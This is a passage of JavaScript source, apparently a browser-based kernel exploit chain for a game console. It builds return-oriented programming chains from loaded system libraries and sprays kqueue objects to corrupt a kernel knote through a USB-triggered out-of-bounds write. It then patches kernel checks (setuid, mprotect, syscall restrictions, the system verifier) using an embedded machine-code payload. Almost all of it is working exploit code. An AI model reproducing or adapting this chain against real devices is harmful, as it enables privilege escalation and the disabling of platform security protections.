    }
    return tlsinit;
}

//Obtain extra gadgets through module loading
function extra_gadgets() {
    handle = p.malloc(0x1E8);
    let randomized_path_length_ptr = handle.add32(0x4);
    let randomized_path_ptr = handle.add32(0x14);
    ex_info = randomized_path_ptr.add32(0x40);

    p.write8(randomized_path_length_ptr, 0x2C);
    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
    random_path = p.readstr(randomized_path_ptr);

    let ipmi_addr = load_prx("libSceIpmi.sprx");
    let hmd_addr = load_prx("libSceHmd.sprx");
    let wk2_addr = load_prx("libSceWebKit2.sprx");

    for (let gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (let gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (let gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }

    for (let gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
        //Ensure all gadgets are available to kernel.
        chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
    }
    chain.run();
}

//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
function kchain_setup() {
    const KERNEL_busy = 0x1B28DF8;

    const KERNEL_bcopy = 0xACD;
    const KERNEL_bzero = 0x2713FD;
    const KERNEL_pagezero = 0x271441;
    const KERNEL_memcpy = 0x2714BD;
    const KERNEL_pagecopy = 0x271501;
    const KERNEL_copyin = 0x2716AD;
    const KERNEL_copyinstr = 0x271B5D;
    const KERNEL_copystr = 0x271C2D;
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;
    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap_1 = 0x16632A;
    const KERNEL_mmap_2 = 0x16632D;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;

    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    //negative offset of kqueue string to kernel base
    //0xFFFFFFFFFF86B593 0x505
    //0xFFFFFFFFFF80E364 0x900
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));

    kchain = new rop();
    kchain2 = new rop();
    //Ensure the krop stack remains available.
    {
        chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
        chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
        chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
    }
    chain.run();

    kchain.count = 0;
    kchain2.count = 0;

    kchain.set_kernel_let(KERNEL_BASE_PTR);
    kchain2.set_kernel_let(KERNEL_BASE_PTR);

    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);

    //Sorry we're closed
    kchain.kwrite1(KERNEL_busy, 0x1);
    kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.


    let idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    let idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    //Modify UD
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE);
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    let idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setidt

    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    let idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setcr0

    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);


    //Initial patch(es)
    kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
    kchain2.kwrite1(KERNEL_bcopy, 0xEB);
    //might as well do the others
    kchain2.kwrite1(KERNEL_bzero, 0xEB);
    kchain2.kwrite1(KERNEL_pagezero, 0xEB);
    kchain2.kwrite1(KERNEL_memcpy, 0xEB);
    kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
    kchain2.kwrite1(KERNEL_copyin, 0xEB);
    kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
    kchain2.kwrite1(KERNEL_copystr, 0xEB);

    //I guess you're not all that bad...
    kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again

    //Restore original UD
    let idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    let idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    let idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    let idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 

    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);

    //Apply kernel patches    
    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    //patch in reverse because /shrug
    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);

    kchain2.kwrite1(KERNEL_setuid, 0xEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite2(KERNEL_prx, 0xE990);
    kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);

    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
    kchain2.kwrite1(KERNEL_mmap_2, 0x37);

    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

    //Restore CR0
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    let idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    let idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
    kchain2.finalizeSymbolic(idx5, idx5_dest);

    //Recover
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    let idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    let idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with old stack pointer
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
    //Map fake object
    let fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
    let fake_filtops = fake_knote.add32(0x4000);
    let fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }
    //setup fake object
    //KNOTE
    {
        p.write8(fake_knote, fake_obj);
        p.write8(fake_knote.add32(0x68), fake_filtops)
    }
    //FILTOPS
    {
        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
        p.write8(fake_filtops.add32(0x8), kchain.stack);
        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
    }
    //OBJ
    {
        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
    }
    //Ensure the fake knote remains available
    chain.syscall(203, fake_knote, 0xC000);
}

let trigger_spray = function () {

    let NUM_KQUEUES = 0x1B0;
    let kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    //Make kqueues
    {
        for (let i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[362]);
            chain.write_result4(kqueue_ptr.add32(0x4 * i));
        }
    }
    chain.run();
    let kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

    let that_one_socket = chain.syscall(97, 2, 1, 0);
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
        alert("invalid socket");
        while (1);
    }

    //Spray kevents
    let kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
    p.write4(kevent.add32(0xC), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0);
    //
    {
        for (let i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
        }
    }
    chain.run();



    //Fragment memory
    {
        for (let i = 18; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();

    //Trigger OOB
    alert("Insert USB now. do not close the dialog until notification pops, remove usb after closing it.");
    //Trigger corrupt knote
    {
        for (let i = 1; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();

    if (chain.syscall(23, 0).low == 0) {
        {
            //cleanup fake knote & release locked gadgets/stack.
            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
            chain.fcall(window.syscalls[325]);
        }
        chain.run();
        return;
    }
    alert(`Failed to trigger the exploit,  This happened because you plugged it in too late/early or not at all.
    if you did plug it in then the kernel heap is slightly corrupted, this might cause panics later on.
    closing this alert will crash the browser for you.`);
    p.write8(0, 0);
    return;
}

//This disables sysveri, see patch.s for more info
let patch_once = function () {

    let patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
    let patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);

    patch_buffer_view[0] = 0x00000BB8;
    patch_buffer_view[1] = 0xFE894800;
    patch_buffer_view[2] = 0x033D8D48;
    patch_buffer_view[3] = 0x0F000000;
    patch_buffer_view[4] = 0x4855C305;
    patch_buffer_view[5] = 0x8B48E589;
    patch_buffer_view[6] = 0x95E8087E;
    patch_buffer_view[7] = 0xE8000000;
    patch_buffer_view[8] = 0x00000175;
    patch_buffer_view[9] = 0x033615FF;
    patch_buffer_view[10] = 0x8B480000;
    patch_buffer_view[11] = 0x0003373D;
    patch_buffer_view[12] = 0x3F8B4800;
    patch_buffer_view[13] = 0x74FF8548;
    patch_buffer_view[14] = 0x3D8D48EB;
    patch_buffer_view[15] = 0x0000029D;
    patch_buffer_view[16] = 0xF9358B48;
    patch_buffer_view[17] = 0x48000002;
    patch_buffer_view[18] = 0x0322158B;
    patch_buffer_view[19] = 0x8B480000;
    patch_buffer_view[20] = 0x00D6E812;
    patch_buffer_view[21] = 0x8D480000;
    patch_buffer_view[22] = 0x00029F3D;
    patch_buffer_view[23] = 0x358B4800;
    patch_buffer_view[24] = 0x000002E4;
    patch_buffer_view[25] = 0x05158B48;
    patch_buffer_view[26] = 0x48000003;
    patch_buffer_view[27] = 0xB9E8128B;
    patch_buffer_view[28] = 0x48000000;
    patch_buffer_view[29] = 0x02633D8D;
    patch_buffer_view[30] = 0x8B480000;
    patch_buffer_view[31] = 0x0002BF35;
    patch_buffer_view[32] = 0x158B4800;
    patch_buffer_view[33] = 0x000002C8;
    patch_buffer_view[34] = 0xE8128B48;
    patch_buffer_view[35] = 0x0000009C;
    patch_buffer_view[36] = 0x7A3D8D48;
    patch_buffer_view[37] = 0x48000002;
    patch_buffer_view[38] = 0x02AA358B;
    patch_buffer_view[39] = 0x8B480000;
    patch_buffer_view[40] = 0x0002AB15;
    patch_buffer_view[41] = 0x128B4800;
    patch_buffer_view[42] = 0x00007FE8;
    patch_buffer_view[43] = 0x0185E800;
    patch_buffer_view[44] = 0xC35D0000;
    patch_buffer_view[45] = 0x6D3D8948;
    patch_buffer_view[46] = 0x48000002;
    patch_buffer_view[47] = 0x026E3D01;
    patch_buffer_view[48] = 0x01480000;
    patch_buffer_view[49] = 0x00026F3D;
    patch_buffer_view[50] = 0x3D014800;
    patch_buffer_view[51] = 0x00000270;
    patch_buffer_view[52] = 0x713D0148;
    patch_buffer_view[53] = 0x48000002;
    patch_buffer_view[54] = 0x02723D01;
    patch_buffer_view[55] = 0x01480000;
    patch_buffer_view[56] = 0x0002933D;
    patch_buffer_view[57] = 0x3D014800;
    patch_buffer_view[58] = 0x00000294;
    patch_buffer_view[59] = 0x653D0148;
    patch_buffer_view[60] = 0x48000002;
    patch_buffer_view[61] = 0x02663D01;
    patch_buffer_view[62] = 0x01480000;
    patch_buffer_view[63] = 0x0002873D;
    patch_buffer_view[64] = 0x3D014800;
    patch_buffer_view[65] = 0x00000288;
    patch_buffer_view[66] = 0x893D0148;
    patch_buffer_view[67] = 0x48000002;
    patch_buffer_view[68] = 0x028A3D01;
    patch_buffer_view[69] = 0x01480000;
    patch_buffer_view[70] = 0x00028B3D;
    patch_buffer_view[71] = 0x3D014800;
    patch_buffer_view[72] = 0x0000024C;
    patch_buffer_view[73] = 0x3D3D0148;
    patch_buffer_view[74] = 0xC3000002;
    patch_buffer_view[75] = 0xE5894855;
    patch_buffer_view[76] = 0x10EC8348;
    patch_buffer_view[77] = 0x24348948;
    patch_buffer_view[78] = 0x24548948;
    patch_buffer_view[79] = 0xED15FF08;
    patch_buffer_view[80] = 0x48000001;
    patch_buffer_view[81] = 0x4B74C085;
    patch_buffer_view[82] = 0x48C28948;
    patch_buffer_view[83] = 0x4840408B;
    patch_buffer_view[84] = 0x2F74C085;
    patch_buffer_view[85] = 0x28788B48;
    patch_buffer_view[86] = 0x243C3B48;
    patch_buffer_view[87] = 0x8B480A74;
    patch_buffer_view[88] = 0xC0854800;
    patch_buffer_view[89] = 0xECEB1D74;
    patch_buffer_view[90] = 0x18788B48;
    patch_buffer_view[91] = 0x74FF8548;
    patch_buffer_view[92] = 0x7F8B48ED;
    patch_buffer_view[93] = 0x7C3B4810;
    patch_buffer_view[94] = 0xE2750824;
    patch_buffer_view[95] = 0xFF1040C7;
    patch_buffer_view[96] = 0x48FFFFFF;
    patch_buffer_view[97] = 0x31107A8D;
    patch_buffer_view[98] = 0x31D231F6;
    patch_buffer_view[99] = 0xA515FFC9;
    patch_buffer_view[100] = 0x48000001;
    patch_buffer_view[101] = 0x5D10C483;
    patch_buffer_view[102] = 0x894855C3;
    patch_buffer_view[103] = 0xC0200FE5;
    patch_buffer_view[104] = 0xFFFF2548;
    patch_buffer_view[105] = 0x220FFFFE;
    patch_buffer_view[106] = 0x3D8B48C0;
    patch_buffer_view[107] = 0x000001C8;
    patch_buffer_view[108] = 0x909007C7;
    patch_buffer_view[109] = 0x47C79090;
    patch_buffer_view[110] = 0x48909004;
    patch_buffer_view[111] = 0x358B48B8;
    patch_buffer_view[112] = 0x000001AC;
    patch_buffer_view[113] = 0x08778948;
    patch_buffer_view[114] = 0x651047C7;
    patch_buffer_view[115] = 0xC73C8B48;
    patch_buffer_view[116] = 0x00251447;
    patch_buffer_view[117] = 0x47C70000;
    patch_buffer_view[118] = 0x89480018;
    patch_buffer_view[119] = 0x1C47C738;
    patch_buffer_view[120] = 0xB8489090;
    patch_buffer_view[121] = 0x7D358B48;
    patch_buffer_view[122] = 0x48000001;
    patch_buffer_view[123] = 0xC7207789;
    patch_buffer_view[124] = 0xC7482847;
    patch_buffer_view[125] = 0x47C70100;
    patch_buffer_view[126] = 0x0000002C;
    patch_buffer_view[127] = 0x778D48E9;
    patch_buffer_view[128] = 0x158B4834;
    patch_buffer_view[129] = 0x00000150;
    patch_buffer_view[130] = 0x89F22948;
    patch_buffer_view[131] = 0x8B483057;
    patch_buffer_view[132] = 0x00016B35;
    patch_buffer_view[133] = 0x568D4800;
    patch_buffer_view[134] = 0xD7294805;
    patch_buffer_view[135] = 0xC148FF89;
    patch_buffer_view[136] = 0x814808E7;
    patch_buffer_view[137] = 0x0000E9CF;
    patch_buffer_view[138] = 0x3E894800;
    patch_buffer_view[139] = 0x00000D48;
    patch_buffer_view[140] = 0x220F0001;
    patch_buffer_view[141] = 0x55C35DC0;
    patch_buffer_view[142] = 0x0FE58948;
    patch_buffer_view[143] = 0x2548C020;
    patch_buffer_view[144] = 0xFFFEFFFF;
    patch_buffer_view[145] = 0x48C0220F;
    patch_buffer_view[146] = 0x013A3D8B;
    patch_buffer_view[147] = 0x07C70000;
    patch_buffer_view[148] = 0x00C3C031;
    patch_buffer_view[149] = 0x353D8B48;
    patch_buffer_view[150] = 0xC7000001;
    patch_buffer_view[151] = 0xC3C03107;
    patch_buffer_view[152] = 0x3D8B4800;
    patch_buffer_view[153] = 0x00000130;
    patch_buffer_view[154] = 0xC03107C7;
    patch_buffer_view[155] = 0x8B4800C3;
    patch_buffer_view[156] = 0x00012B3D;
    patch_buffer_view[157] = 0x3107C700;
    patch_buffer_view[158] = 0x4800C3C0;
    patch_buffer_view[159] = 0x00A63D8B;
    patch_buffer_view[160] = 0x87C70000;
    patch_buffer_view[161] = 0x001F1E01;
    patch_buffer_view[162] = 0x9090F631;
    patch_buffer_view[163] = 0x1E0587C7;
    patch_buffer_view[164] = 0xC931001F;
    patch_buffer_view[165] = 0x87C79090;
    patch_buffer_view[166] = 0x001F1E09;
    patch_buffer_view[167] = 0x9090D231;
    patch_buffer_view[168] = 0x1E3E87C7;
    patch_buffer_view[169] = 0xC931001F;
    patch_buffer_view[170] = 0x0D489090;
    patch_buffer_view[171] = 0x00010000;
    patch_buffer_view[172] = 0xFFC0220F;
    patch_buffer_view[173] = 0x0000EF15;
    patch_buffer_view[174] = 0xC0200F00;
    patch_buffer_view[175] = 0xFFFF2548;
    patch_buffer_view[176] = 0x220FFFFE;
    patch_buffer_view[177] = 0x3D8B48C0;
    patch_buffer_view[178] = 0x000000DC;
    patch_buffer_view[179] = 0xC03107C7;
    patch_buffer_view[180] = 0x0D4800C3;
    patch_buffer_view[181] = 0x00010000;
    patch_buffer_view[182] = 0x5DC0220F;
    patch_buffer_view[183] = 0x737973C3;
    patch_buffer_view[184] = 0x5F6D6574;
    patch_buffer_view[185] = 0x70737573;
    patch_buffer_view[186] = 0x5F646E65;
    patch_buffer_view[187] = 0x73616870;
    patch_buffer_view[188] = 0x705F3265;
    patch_buffer_view[189] = 0x735F6572;
    patch_buffer_view[190] = 0x00636E79;
    patch_buffer_view[191] = 0x74737973;
    patch_buffer_view[192] = 0x725F6D65;
    patch_buffer_view[193] = 0x6D757365;
    patch_buffer_view[194] = 0x68705F65;
    patch_buffer_view[195] = 0x32657361;
    patch_buffer_view[196] = 0x73797300;
    patch_buffer_view[197] = 0x5F6D6574;
    patch_buffer_view[198] = 0x75736572;
    patch_buffer_view[199] = 0x705F656D;
    patch_buffer_view[200] = 0x65736168;
    patch_buffer_view[201] = 0x90900033;
    patch_buffer_view[202] = 0x00000000;
    patch_buffer_view[203] = 0x00000000;
    patch_buffer_view[204] = 0x000F88F0;
    patch_buffer_view[205] = 0x00000000;
    patch_buffer_view[206] = 0x002EF170;
    patch_buffer_view[207] = 0x00000000;
    patch_buffer_view[208] = 0x00018DF0;
    patch_buffer_view[209] = 0x00000000;
    patch_buffer_view[210] = 0x00018EF0;
    patch_buffer_view[211] = 0x00000000;
    patch_buffer_view[212] = 0x02654110;
    patch_buffer_view[213] = 0x00000000;
    patch_buffer_view[214] = 0x00097230;
    patch_buffer_view[215] = 0x00000000;
    patch_buffer_view[216] = 0x00402E60;
    patch_buffer_view[217] = 0x00000000;
    patch_buffer_view[218] = 0x01520108;
    patch_buffer_view[219] = 0x00000000;
    patch_buffer_view[220] = 0x01520100;
    patch_buffer_view[221] = 0x00000000;
    patch_buffer_view[222] = 0x00462D20;
    patch_buffer_view[223] = 0x00000000;
    patch_buffer_view[224] = 0x00462DFC;
    patch_buffer_view[225] = 0x00000000;
    patch_buffer_view[226] = 0x006259A0;
    patch_buffer_view[227] = 0x00000000;
    patch_buffer_view[228] = 0x006268D0;
    patch_buffer_view[229] = 0x00000000;
    patch_buffer_view[230] = 0x00625DC0;
    patch_buffer_view[231] = 0x00000000;
    patch_buffer_view[232] = 0x00626290;
    patch_buffer_view[233] = 0x00000000;
    patch_buffer_view[234] = 0x00626720;
    patch_buffer_view[235] = 0x00000000;
    //lock payload / call payload / release payload
    {
        chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
        chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
        chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
    }
    chain.run();
}